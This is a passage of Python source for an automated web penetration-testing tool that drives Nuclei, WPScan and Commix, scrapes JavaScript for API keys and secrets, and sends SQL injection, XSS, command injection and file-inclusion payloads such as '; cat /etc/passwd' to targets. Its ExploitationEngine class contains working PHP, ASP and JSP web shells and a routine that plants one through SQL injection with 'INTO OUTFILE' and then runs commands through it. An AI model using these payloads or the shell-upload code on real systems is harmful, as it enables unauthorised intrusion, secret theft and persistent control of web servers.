            print(f"{Colors.RED}[-] Nuclei not found and Go not available for installation{Colors.END}")
            return nuclei_results
        
        # Update nuclei templates
        print(f"{Colors.CYAN}[INFO] Updating Nuclei templates...{Colors.END}")
        try:
            update_cmd = ['nuclei', '-update-templates']
            print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(update_cmd)}{Colors.END}")
            subprocess.run(update_cmd, capture_output=True, text=True, timeout=60)
            print(f"{Colors.GREEN}[+] Nuclei templates updated{Colors.END}")
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Template update failed: {e}{Colors.END}")
        
        for target in targets:
            try:
                # Run Nuclei scan with high and critical severity
                cmd = [
                    'nuclei', '-target', target, 
                    '-severity', 'critical,high,medium',
                    '-rate-limit', '10',
                    '-timeout', '10',
                    '-retries', '1',
                    '-v'
                ]
                
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running Nuclei template scan on {target}...{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Scanning with critical, high, and medium severity templates{Colors.END}")
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[NUCLEI OUTPUT]:{Colors.END}")
                    findings = []
                    
                    for line in result.stdout.split('\n'):
                        if line.strip() and any(keyword in line for keyword in ['[critical]', '[high]', '[medium]', 'MATCHED']):
                            print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                            findings.append(line.strip())
                    
                    # Parse stderr for additional findings
                    for line in result.stderr.split('\n'):
                        if line.strip() and any(keyword in line for keyword in ['[critical]', '[high]', '[medium]']):
                            print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                            findings.append(line.strip())
                    
                    if findings:
                        nuclei_results[target] = findings
                        print(f"{Colors.GREEN}[+] Nuclei found {len(findings)} vulnerabilities in {target}{Colors.END}")
                        
                        # Show vulnerability summary by severity
                        critical_count = len([f for f in findings if '[critical]' in f.lower()])
                        high_count = len([f for f in findings if '[high]' in f.lower()])
                        medium_count = len([f for f in findings if '[medium]' in f.lower()])
                        
                        print(f"{Colors.GREEN}[NUCLEI SUMMARY]:{Colors.END}")
                        if critical_count > 0:
                            print(f"  {Colors.RED}Critical: {critical_count}{Colors.END}")
                        if high_count > 0:
                            print(f"  {Colors.YELLOW}High: {high_count}{Colors.END}")
                        if medium_count > 0:
                            print(f"  {Colors.BLUE}Medium: {medium_count}{Colors.END}")
                        
                        # Show top findings
                        print(f"{Colors.GREEN}[TOP FINDINGS]:{Colors.END}")
                        for finding in findings[:5]:
                            print(f"  {Colors.WHITE}{finding[:80]}...{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] No vulnerabilities found with Nuclei for {target}{Colors.END}")
                        nuclei_results[target] = []
                else:
                    print(f"{Colors.RED}[-] Nuclei scan failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] Nuclei scan timeout for {target} after 300 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] Nuclei scan failed for {target}: {e}{Colors.END}")
        
        return nuclei_results
    
    def wpscan_analysis(self, targets):
        """WordPress vulnerability scanner using WPScan"""
        print(f"{Colors.YELLOW}[*] Starting WPScan WordPress security analysis{Colors.END}")
        
        wpscan_results = {}
        
        # Check if WPScan is installed
        try:
            version_cmd = ['wpscan', '--version']
            result = subprocess.run(version_cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] WPScan installed:{Colors.END}")
                for line in result.stdout.split('\n'):
                    if line.strip():
                        print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[!] WPScan not found. Installing...{Colors.END}")
                # Install WPScan
                apt_cmd = ['sudo', 'apt', 'install', '-y', 'wpscan']
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(apt_cmd)}{Colors.END}")
                subprocess.run(apt_cmd, capture_output=True, timeout=300)
                print(f"{Colors.GREEN}[+] WPScan installation completed{Colors.END}")
        
        except (FileNotFoundError, subprocess.SubprocessError) as e:
            print(f"{Colors.RED}[-] WPScan check failed: {e}{Colors.END}")
            print(f"{Colors.RED}[-] Run 'sudo apt install -y wpscan' to install manually{Colors.END}")
            return wpscan_results
        
        # Try to get API token from environment variable
        wpscan_api_token = os.environ.get('WPSCAN_API_TOKEN', '')
        api_flag = []
        if wpscan_api_token:
            print(f"{Colors.GREEN}[+] WPScan API token found in environment variables{Colors.END}")
            api_flag = ['--api-token', wpscan_api_token]
        else:
            print(f"{Colors.YELLOW}[!] No WPScan API token found. Limited vulnerability data will be available{Colors.END}")
            print(f"{Colors.YELLOW}[!] Get a free API token from https://wpscan.com/ and set as WPSCAN_API_TOKEN environment variable{Colors.END}")
        
        for target in targets:
            try:
                # Check if target is WordPress
                print(f"{Colors.CYAN}[INFO] Checking if {target} is a WordPress site...{Colors.END}")
                # First run a quick check to see if it's WordPress
                check_cmd = ['wpscan', '--url', target, '--detection-mode', 'passive']
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(check_cmd)}{Colors.END}")
                check_result = subprocess.run(check_cmd, capture_output=True, text=True, timeout=30)
                
                is_wordpress = False
                if check_result.returncode == 0:
                    for line in check_result.stdout.split('\n'):
                        if 'WordPress version' in line or 'WordPress theme' in line or 'This site appears to be running WordPress' in line:
                            is_wordpress = True
                            break
                
                if not is_wordpress:
                    print(f"{Colors.YELLOW}[!] {target} does not appear to be a WordPress site. Skipping.{Colors.END}")
                    continue
                
                # Run comprehensive WPScan
                scan_cmd = [
                    'wpscan', 
                    '--url', target,
                    '--enumerate', 'ap,at,tt,cb,dbe,u,m',
                    '--random-user-agent',
                    '--format', 'json',
                    '--output', f"{self.output_dir}/wpscan_{target.replace('://', '_').replace('/', '_').replace('.', '_')}.json"
                ] + api_flag
                
                print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(scan_cmd)}{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Running comprehensive WPScan on {target}...{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Scanning for WordPress vulnerabilities, plugins, themes, users...{Colors.END}")
                
                result = subprocess.run(scan_cmd, capture_output=True, text=True, timeout=600)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[WPSCAN OUTPUT]:{Colors.END}")
                    
                    # Parse the JSON output
                    findings = {}
                    
                    # Save raw output for text analysis
                    text_cmd = [
                        'wpscan', 
                        '--url', target,
                        '--enumerate', 'ap,at,tt,cb,dbe,u,m',
                        '--random-user-agent'
                    ] + api_flag
                    text_result = subprocess.run(text_cmd, capture_output=True, text=True, timeout=600)
                    
                    # Process text results for display
                    interesting_lines = []
                    vuln_count = 0
                    user_count = 0
                    plugin_count = 0
                    theme_count = 0
                    found_version = "Unknown"
                    
                    for line in text_result.stdout.split('\n'):
                        if any(keyword in line for keyword in ['vulnerability', 'vulnerabilities', 'vulnerable', 'identified']):                            
                            print(f"  {Colors.RED}{line.strip()}{Colors.END}")
                            interesting_lines.append(line.strip())
                            if 'vulnerability' in line.lower() or 'vulnerabilities' in line.lower():
                                vuln_count += 1
                        
                        elif 'WordPress version' in line:
                            found_version = line.strip()
                            print(f"  {Colors.CYAN}{line.strip()}{Colors.END}")
                            interesting_lines.append(line.strip())
                        
                        elif '[+] WordPress theme' in line or '[!] WordPress theme' in line:
                            theme_count += 1
                            print(f"  {Colors.YELLOW}{line.strip()}{Colors.END}")
                            interesting_lines.append(line.strip())
                        
                        elif '[+] WordPress plugin' in line or '[!] WordPress plugin' in line:
                            plugin_count += 1
                            print(f"  {Colors.PURPLE}{line.strip()}{Colors.END}")
                            interesting_lines.append(line.strip())
                        
                        elif 'Username:' in line or '[+] User(' in line or '[+] User(' in line:
                            user_count += 1
                            print(f"  {Colors.BLUE}{line.strip()}{Colors.END}")
                            interesting_lines.append(line.strip())
                    
                    findings = {
                        'version': found_version,
                        'vulnerabilities': vuln_count,
                        'plugins': plugin_count,
                        'themes': theme_count,
                        'users': user_count,
                        'interesting_findings': interesting_lines
                    }
                    
                    wpscan_results[target] = findings
                    print(f"\n{Colors.GREEN}[WPSCAN SUMMARY FOR {target}]:{Colors.END}")
                    print(f"  {Colors.CYAN}WordPress Version: {found_version.split(':')[-1].strip() if ':' in found_version else found_version}{Colors.END}")
                    print(f"  {Colors.RED}Vulnerabilities: {vuln_count}{Colors.END}")
                    print(f"  {Colors.PURPLE}Plugins: {plugin_count}{Colors.END}")
                    print(f"  {Colors.YELLOW}Themes: {theme_count}{Colors.END}")
                    print(f"  {Colors.BLUE}Users: {user_count}{Colors.END}")
                    
                    output_file = f"{self.output_dir}/wpscan_{target.replace('://', '_').replace('/', '_').replace('.', '_')}.json"
                    print(f"  {Colors.GREEN}Detailed report: {output_file}{Colors.END}")
                    
                    if vuln_count > 0:
                        print(f"\n{Colors.RED}[WARNING] WordPress vulnerabilities detected in {target}!{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] WPScan failed with exit code {result.returncode}{Colors.END}")
                    if result.stderr:
                        print(f"{Colors.RED}[ERROR] {result.stderr.strip()}{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] WPScan timeout for {target} after 600 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] WPScan failed for {target}: {e}{Colors.END}")
        
        return wpscan_results
    
    def commix_command_injection_scan(self, targets):
        """Command injection testing using Commix"""
        print(f"{Colors.YELLOW}[*] Starting Commix command injection vulnerability scan{Colors.END}")
        
        commix_results = {}
        
        # Check if Commix is available
        commix_paths = [
            '/opt/commix/commix.py',
            '/usr/share/commix/commix.py',
            '/home/kali/tools/commix/commix.py'
        ]
        
        commix_path = None
        for path in commix_paths:
            if os.path.exists(path):
                commix_path = path
                break
        
        # Try system commix command
        if not commix_path:
            try:
                result = subprocess.run(['which', 'commix'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    commix_path = 'commix'
                    print(f"{Colors.GREEN}[+] Commix found in system PATH{Colors.END}")
            except:
                pass
        
        if not commix_path:
            print(f"{Colors.YELLOW}[!] Commix not found. Installing...{Colors.END}")
            try:
                # Clone Commix if not available
                clone_cmd = ['git', 'clone', 'https://github.com/commixproject/commix.git', '/opt/commix']
                print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(clone_cmd)}{Colors.END}")
                result = subprocess.run(clone_cmd, capture_output=True, text=True, timeout=60)
                
                if result.returncode == 0:
                    commix_path = '/opt/commix/commix.py'
                    print(f"{Colors.GREEN}[+] Commix installed successfully{Colors.END}")
                    
                    # Install requirements if needed
                    req_file = '/opt/commix/requirements.txt'
                    if os.path.exists(req_file):
                        req_cmd = ['pip3', 'install', '-r', req_file]
                        print(f"{Colors.PURPLE}[CMD] Executing: {' '.join(req_cmd)}{Colors.END}")
                        subprocess.run(req_cmd, capture_output=True)
                else:
                    print(f"{Colors.RED}[-] Failed to install Commix{Colors.END}")
                    return commix_results
            except Exception as e:
                print(f"{Colors.RED}[-] Commix installation failed: {e}{Colors.END}")
                return commix_results
        
        for target in targets:
            try:
                # Test common injection parameters
                test_params = ['id', 'cmd', 'exec', 'command', 'ping', 'ip', 'host', 'file', 'path', 'page']
                
                for param in test_params:
                    test_url = f"{target}?{param}=INJECT_HERE"
                    
                    if commix_path == 'commix':
                        cmd = [
                            'commix',
                            '--url', test_url,
                            '--batch',
                            '--level', '2',
                            '--risk', '2',
                            '--timeout', '10'
                        ]
                    else:
                        cmd = [
                            'python3', commix_path,
                            '--url', test_url,
                            '--batch',
                            '--level', '2',
                            '--risk', '2',
                            '--timeout', '10'
                        ]
                    
                    print(f"\n{Colors.PURPLE}[CMD] Executing: {' '.join(cmd)}{Colors.END}")
                    print(f"{Colors.CYAN}[INFO] Testing command injection on {target} parameter '{param}'...{Colors.END}")
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    
                    if result.returncode == 0:
                        # Check if vulnerabilities were found
                        vulnerabilities = []
                        
                        for line in result.stdout.split('\n'):
                            if any(keyword in line.lower() for keyword in ['vulnerable', 'injection', 'identified', 'payload', 'confirmed']):
                                print(f"  {Colors.RED}{line.strip()}{Colors.END}")
                                vulnerabilities.append(line.strip())
                            elif any(keyword in line for keyword in ['[INFO]', '[WARNING]', '[ERROR]']):
                                # Show relevant info lines
                                if 'Testing' in line or 'injection' in line.lower():
                                    print(f"  {Colors.WHITE}{line.strip()}{Colors.END}")
                        
                        if vulnerabilities:
                            if target not in commix_results:
                                commix_results[target] = []
                            commix_results[target].extend(vulnerabilities)
                            print(f"{Colors.GREEN}[+] Command injection vulnerability found in parameter '{param}'{Colors.END}")
                            # Don't test other parameters if we found one
                            break
                        else:
                            print(f"{Colors.YELLOW}[!] No command injection found in parameter '{param}'{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] Commix scan failed for parameter '{param}' with exit code {result.returncode}{Colors.END}")
                        if result.stderr and 'timeout' not in result.stderr.lower():
                            print(f"{Colors.RED}[ERROR] {result.stderr.strip()[:100]}...{Colors.END}")
                
                # Summary for this target
                if target in commix_results and commix_results[target]:
                    print(f"\n{Colors.GREEN}[COMMIX SUMMARY FOR {target}]:{Colors.END}")
                    print(f"  {Colors.RED}Command Injection Vulnerabilities: {len(commix_results[target])}{Colors.END}")
                    
                    print(f"{Colors.GREEN}[VULNERABILITIES FOUND]:{Colors.END}")
                    for vuln in commix_results[target][:3]:  # Show first 3
                        print(f"  {Colors.WHITE}{vuln[:80]}...{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}[!] No command injection vulnerabilities found in {target}{Colors.END}")
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}[-] Commix scan timeout for {target} after 120 seconds{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] Commix scan failed for {target}: {e}{Colors.END}")
        
        return commix_results
    
    def javascript_analysis(self, targets):
        """JavaScript endpoint discovery and analysis"""
        print(f"{Colors.YELLOW}[*] Starting JavaScript endpoint discovery and analysis{Colors.END}")
        
        js_results = {}
        
        for target in targets:
            try:
                print(f"\n{Colors.CYAN}[INFO] Analyzing JavaScript files for {target}...{Colors.END}")
                
                js_findings = {
                    'js_files': [],
                    'endpoints': [],
                    'secrets': [],
                    'api_keys': [],
                    'urls': []
                }
                
                # Step 1: Get the main page and extract JavaScript files
                print(f"{Colors.PURPLE}[CMD] Fetching main page: {target}{Colors.END}")
                response = self.session.get(target, timeout=10, verify=False)
                
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Retrieved main page ({len(response.text)} bytes){Colors.END}")
                    
                    # Extract JavaScript file URLs
                    js_files = self._extract_js_files(target, response.text)
                    js_findings['js_files'] = js_files
                    
                    print(f"{Colors.GREEN}[JS FILES FOUND]: {len(js_files)}{Colors.END}")
                    for js_file in js_files[:10]:  # Show first 10
                        print(f"  {Colors.WHITE}{js_file}{Colors.END}")
                    
                    # Step 2: Analyze each JavaScript file
                    for js_file in js_files:
                        try:
                            print(f"\n{Colors.CYAN}[INFO] Analyzing JavaScript file: {js_file}{Colors.END}")
                            
                            js_response = self.session.get(js_file, timeout=10, verify=False)
                            if js_response.status_code == 200:
                                js_content = js_response.text
                                
                                # Extract endpoints
                                endpoints = self._extract_js_endpoints(js_content)
                                js_findings['endpoints'].extend(endpoints)
                                
                                # Extract potential secrets/API keys
                                secrets = self._extract_js_secrets(js_content)
                                js_findings['secrets'].extend(secrets)
                                
                                # Extract URLs
                                urls = self._extract_js_urls(js_content)
                                js_findings['urls'].extend(urls)
                                
                                print(f"  {Colors.GREEN}Endpoints: {len(endpoints)}, Secrets: {len(secrets)}, URLs: {len(urls)}{Colors.END}")
                            else:
                                print(f"  {Colors.RED}Failed to fetch {js_file} ({js_response.status_code}){Colors.END}")
                        
                        except Exception as e:
                            print(f"  {Colors.RED}Error analyzing {js_file}: {str(e)[:50]}...{Colors.END}")
                    
                    # Remove duplicates
                    js_findings['endpoints'] = list(set(js_findings['endpoints']))
                    js_findings['secrets'] = list(set(js_findings['secrets']))
                    js_findings['urls'] = list(set(js_findings['urls']))
                    
                    js_results[target] = js_findings
                    
                    # Display summary
                    print(f"\n{Colors.GREEN}[JAVASCRIPT ANALYSIS SUMMARY FOR {target}]:{Colors.END}")
                    print(f"  {Colors.CYAN}JavaScript Files: {len(js_findings['js_files'])}{Colors.END}")
                    print(f"  {Colors.BLUE}API Endpoints: {len(js_findings['endpoints'])}{Colors.END}")
                    print(f"  {Colors.PURPLE}URLs Found: {len(js_findings['urls'])}{Colors.END}")
                    print(f"  {Colors.RED}Potential Secrets: {len(js_findings['secrets'])}{Colors.END}")
                    
                    # Show interesting findings
                    if js_findings['endpoints']:
                        print(f"\n{Colors.GREEN}[API ENDPOINTS DISCOVERED]:{Colors.END}")
                        for endpoint in js_findings['endpoints'][:5]:  # Show first 5
                            print(f"  {Colors.WHITE}{endpoint}{Colors.END}")
                    
                    if js_findings['secrets']:
                        print(f"\n{Colors.RED}[POTENTIAL SECRETS FOUND]:{Colors.END}")
                        for secret in js_findings['secrets'][:3]:  # Show first 3
                            print(f"  {Colors.WHITE}{secret[:80]}...{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] Failed to fetch main page: {response.status_code}{Colors.END}")
                
            except Exception as e:
                print(f"{Colors.RED}[-] JavaScript analysis failed for {target}: {e}{Colors.END}")
        
        return js_results
    
    def _extract_js_files(self, base_url, html_content):
        """Extract JavaScript file URLs from HTML content"""
        js_files = []
        
        # Use BeautifulSoup to parse HTML
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Find script tags with src attribute
            for script in soup.find_all('script', src=True):
                src = script.get('src')
                if src:
                    # Convert relative URLs to absolute
                    if src.startswith('//'):
                        js_url = 'https:' + src
                    elif src.startswith('/'):
                        js_url = base_url.rstrip('/') + src
                    elif src.startswith('http'):
                        js_url = src
                    else:
                        js_url = base_url.rstrip('/') + '/' + src
                    
                    js_files.append(js_url)
        except Exception as e:
            # Fallback to regex if BeautifulSoup fails
            import re
            js_pattern = r'src=["\']([^"\']*.js[^"\'\']*)["\']'
            matches = re.findall(js_pattern, html_content, re.IGNORECASE)
            
            for match in matches:
                if match.startswith('//'):
                    js_url = 'https:' + match
                elif match.startswith('/'):
                    js_url = base_url.rstrip('/') + match
                elif match.startswith('http'):
                    js_url = match
                else:
                    js_url = base_url.rstrip('/') + '/' + match
                
                js_files.append(js_url)
        
        return js_files
    
    def _extract_js_endpoints(self, js_content):
        """Extract API endpoints from JavaScript content"""
        import re
        endpoints = []
        
        # Common API endpoint patterns
        patterns = [
            r'["\'](\/api\/[^"\'\'\s]+)["\']',
            r'["\'](\/v\d+\/[^"\'\'\s]+)["\']',
            r'["\'](\/rest\/[^"\'\'\s]+)["\']',
            r'["\'](\/graphql[^"\'\'\s]*)["\']',
            r'["\'](\/admin\/[^"\'\'\s]+)["\']',
            r'["\'](\/wp-json\/[^"\'\'\s]+)["\']',
            r'url:\s*["\'](\/[^"\'\'\s]+)["\']',
            r'fetch\(["\']([^"\'\'\s]+)["\']\)',
            r'ajax\(["\']([^"\'\'\s]+)["\']\)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                if len(match) > 3 and '.' not in match.split('/')[-1]:  # Filter out file extensions
                    endpoints.append(match)
        
        return endpoints
    
    def _extract_js_secrets(self, js_content):
        """Extract potential secrets and API keys from JavaScript content"""
        import re
        secrets = []
        
        # Common secret patterns
        secret_patterns = [
            r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\'\s]{10,})["\']',
            r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\'\s]{10,})["\']',
            r'access[_-]?token["\']?\s*[:=]\s*["\']([^"\'\'\s]{10,})["\']',
            r'auth[_-]?token["\']?\s*[:=]\s*["\']([^"\'\'\s]{10,})["\']',
            r'password["\']?\s*[:=]\s*["\']([^"\'\'\s]{8,})["\']',
            r'["\']([A-Za-z0-9+\/]{40,}={0,2})["\']',
            r'["\']([0-9a-f]{32,})["\']',
        ]
        
        for pattern in secret_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                if len(match) > 8 and not any(common in match.lower() for common in ['test', 'example', 'demo', 'placeholder']):
                    secrets.append(match)
        
        return secrets
    
    def _extract_js_urls(self, js_content):
        """Extract URLs from JavaScript content"""
        import re
        urls = []
        
        # URL patterns
        url_patterns = [
            r'https?:\/\/[^"\'\'\s<>]+',
            r'\/\/[^"\'\'\s<>]+\.[a-zA-Z]{2,}[^"\'\'\s<>]*',
        ]
        
        for pattern in url_patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                if len(match) > 10:
                    urls.append(match)
        
        return urls

class VulnerabilityScanner:
    """Comprehensive vulnerability scanning engine"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
    
    def scan_sql_injection(self, web_services, discovered_paths):
        """SQL injection vulnerability scanning"""
        print(f"{Colors.YELLOW}[*] Scanning for SQL injection vulnerabilities{Colors.END}")
        
        sql_payloads = [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", 
            "'; DROP TABLE users--", "' UNION SELECT NULL--", 
            "' AND 1=1--", "' AND 1=2--"
        ]
        
        for service in web_services:
            base_url = service['url']
            
            # Test discovered paths with parameters
            for url, paths in discovered_paths.items():
                if url == base_url:
                    for path, status in paths:
                        if '?' in path or any(ext in path for ext in ['.php', '.asp', '.aspx', '.jsp']):
                            test_url = f"{base_url}{path}"
                            self._test_sql_injection(test_url, sql_payloads)
    
    def scan_xss(self, web_services, discovered_paths):
        """Cross-site scripting vulnerability scanning"""
        print(f"{Colors.YELLOW}[*] Scanning for XSS vulnerabilities{Colors.END}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>"
        ]
        
        for service in web_services:
            base_url = service['url']
            
            # Test for reflected XSS in search parameters
            test_params = ['q', 'search', 'query', 'keyword', 'term']
            
            for param in test_params:
                for payload in xss_payloads:
                    try:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=10)
                        
                        if payload in response.text and response.status_code == 200:
                            self.vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'url': test_url,
                                'payload': payload,
                                'severity': 'Medium',
                                'evidence': f"Payload reflected in response"
                            })
                            print(f"{Colors.RED}[!] XSS found: {test_url}{Colors.END}")
                            break
                            
                    except requests.RequestException:
                        continue
    
    def scan_command_injection(self, web_services, discovered_paths):
        """Command injection vulnerability scanning"""
        print(f"{Colors.YELLOW}[*] Scanning for command injection vulnerabilities{Colors.END}")
        
        cmd_payloads = [
            "; ls", "| whoami", "` id `", "$(whoami)", "&& dir",
            "; cat /etc/passwd", "| cat /etc/passwd"
        ]
        
        # Test parameters that might be vulnerable to command injection
        test_params = ['cmd', 'exec', 'command', 'ping', 'ip', 'host', 'file']
        
        for service in web_services:
            base_url = service['url']
            
            for param in test_params:
                for payload in cmd_payloads:
                    try:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=15)
                        
                        # Look for command execution indicators
                        indicators = ['uid=', 'gid=', 'root:', '/bin/', 'Volume in drive']
                        
                        if any(indicator in response.text for indicator in indicators):
                            self.vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': test_url,
                                'payload': payload,
                                'severity': 'High',
                                'evidence': f"Command execution indicators found"
                            })
                            print(f"{Colors.RED}[!] Command injection found: {test_url}{Colors.END}")
                            
                    except requests.RequestException:
                        continue
    
    def scan_file_inclusion(self, web_services, discovered_paths):
        """Local/Remote file inclusion vulnerability scanning"""
        print(f"{Colors.YELLOW}[*] Scanning for file inclusion vulnerabilities{Colors.END}")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd",
            "/etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        ]
        
        file_params = ['file', 'page', 'include', 'path', 'doc', 'document']
        
        for service in web_services:
            base_url = service['url']
            
            for param in file_params:
                for payload in lfi_payloads:
                    try:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check for file inclusion indicators
                        if ('root:' in response.text or 
                            'localhost' in response.text or 
                            'bin/bash' in response.text):
                            
                            self.vulnerabilities.append({
                                'type': 'Local File Inclusion (LFI)',
                                'url': test_url,
                                'payload': payload,
                                'severity': 'High',
                                'evidence': f"File system access detected"
                            })
                            print(f"{Colors.RED}[!] LFI found: {test_url}{Colors.END}")
                            
                    except requests.RequestException:
                        continue
    
    def _test_sql_injection(self, url, payloads):
        """Test a specific URL for SQL injection"""
        for payload in payloads:
            try:
                # Add payload to existing parameters or create new ones
                if '?' in url:
                    test_url = f"{url}&test={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{url}?test={urllib.parse.quote(payload)}"
                
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error patterns
                sql_errors = [
                    'mysql_fetch', 'mysql_num_rows', 'mysql_error', 'mysqli',
                    'ORA-', 'Microsoft Access Driver', 'Microsoft JET Database',
                    'PostgreSQL query failed', 'pg_exec', 'pg_query',
                    'sqlite_exec', 'sqlite_query', 'sqlite_step'
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High',
                            'evidence': f"Database error: {error}"
                        })
                        print(f"{Colors.RED}[!] SQL injection found: {test_url}{Colors.END}")
                        return
                        
            except requests.RequestException:
                continue

class ExploitationEngine:
    """Automated exploitation and post-exploitation"""
    
    def __init__(self):
        self.session = requests.Session()
        self.shells = {
            'php': "<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>",
            'asp': "<%eval(request('cmd'))%>",
            'jsp': "<%if(request.getParameter('cmd')!=null){out.println('<pre>');Runtime.getRuntime().exec(request.getParameter('cmd'));}%>"
        }
    
    def attempt_web_shell_upload(self, vulnerabilities):
        """Attempt to upload web shells through discovered vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Attempting web shell upload{Colors.END}")
        
        uploaded_shells = []
        
        for vuln in vulnerabilities:
            if vuln['type'] in ['SQL Injection', 'Local File Inclusion (LFI)']:
                try:
                    # Attempt various upload methods
                    shell_url = self._try_shell_upload(vuln['url'])
                    if shell_url:
                        uploaded_shells.append(shell_url)
                        print(f"{Colors.GREEN}[+] Shell uploaded: {shell_url}{Colors.END}")
                        
                        # Test shell functionality
                        if self._test_shell(shell_url):
                            print(f"{Colors.GREEN}[+] Shell is functional{Colors.END}")
                            
                except Exception as e:
                    print(f"{Colors.RED}[-] Shell upload failed: {e}{Colors.END}")
        
        return uploaded_shells
    
    def _try_shell_upload(self, vulnerable_url):
        """Try to upload a shell through various methods"""
        # This is a simplified example - real implementation would be more sophisticated
        
        # Try PHP shell upload via SQL injection
        if 'test=' in vulnerable_url:
            # Replace test parameter with shell upload payload
            shell_payload = f"'; SELECT '{self.shells['php']}' INTO OUTFILE '/var/www/html/shell.php'--"
            upload_url = vulnerable_url.replace('test=', f'test={urllib.parse.quote(shell_payload)}')
            
            try:
                self.session.get(upload_url, timeout=10)
                
                # Test if shell was uploaded
                base_url = vulnerable_url.split('?')[0]
                shell_url = f"{base_url.rsplit('/', 1)[0]}/shell.php"
                
                response = self.session.get(f"{shell_url}?cmd=whoami", timeout=10)
                if response.status_code == 200 and len(response.text.strip()) > 0:
                    return shell_url
                    
            except requests.RequestException:
                pass
        
        return None
    
    def _test_shell(self, shell_url):
        """Test if uploaded shell is working"""
        try:
            response = self.session.get(f"{shell_url}?cmd=id", timeout=10)
            return 'uid=' in response.text or 'gid=' in response.text
        except:
            return False

class ReportGenerator:
    """Professional penetration testing report generator"""
    
    def __init__(self):
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def generate_html_report(self, target, reconnaissance_data, vulnerabilities, output_dir):
        """Generate comprehensive HTML report"""
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        report_file = f"{output_dir}/web_pentest_report_{self.timestamp}.html"
        
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Penetration Test Report - {target}</title>
    <style>
        body {{ font-family: 'Arial', sans-serif; line-height: 1.6; margin: 0; padding: 20px; background-color: #f4f4f4; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 30px; margin-bottom: 30px; border-radius: 10px; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
        .section {{ margin-bottom: 30px; padding: 20px; border-left: 5px solid #2196F3; background-color: #f8f9fa; }}
        .vulnerability {{ background-color: #fff; border: 1px solid #ddd; padding: 20px; margin-bottom: 20px; border-radius: 5px; }}
        .critical {{ border-left: 5px solid #f44336; }}
        .high {{ border-left: 5px solid #ff9800; }}
        .medium {{ border-left: 5px solid #ffeb3b; }}
        .low {{ border-left: 5px solid #4caf50; }}
